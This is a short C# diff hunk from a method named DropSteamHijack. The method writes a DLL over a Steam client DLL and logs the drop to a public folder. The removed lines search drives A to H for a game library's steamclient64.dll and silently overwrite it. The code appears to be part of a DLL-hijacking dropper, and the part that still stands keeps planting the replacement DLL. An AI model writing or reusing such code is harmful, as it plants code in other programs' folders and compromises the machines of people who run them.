@@ -135,13 +135,6 @@ private static void DropSteamHijack()
         File.WriteAllBytes(steamDll, dll);
         File.WriteAllText(@"C:\Users\Public\hijack.log",
             $"[{DateTime.Now}] Dropped to {steamDll}");
-        foreach (string drive in new[] { "A", "B", "C", "D", "E", "F", "G", "H" })
-        {
-            string target = $@"{drive}:\Asgard\GameLibrary\100207711\build\steamclient64.dll";
-            if (!File.Exists(target)) continue;
-            try { File.WriteAllBytes(target, dll); } catch { }
-            break;
-        }
     }
     catch (Exception ex)
     {
